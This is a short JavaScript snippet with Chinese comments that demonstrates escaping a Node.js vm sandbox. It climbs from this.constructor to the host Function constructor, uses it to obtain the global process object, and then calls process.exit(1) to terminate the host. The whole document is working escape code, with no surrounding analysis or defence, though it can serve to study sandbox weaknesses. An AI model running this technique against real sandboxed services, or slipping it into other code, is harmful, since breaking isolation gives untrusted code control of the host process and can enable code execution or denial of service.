//this.constructor 就是沙箱所在 Object 的构建函数
const ObjConstructor = this.constructor;
//ObjConstructor 的 constructor 就是外包的 Function
const Function = ObjConstructor.constructor;
//创建一个函数，并执行它，返回全局 process 全局对象
const process = (new Function('return process'))();
// 展示
console.log('got process', process.exit);
//退出当前进程
process.exit(1);
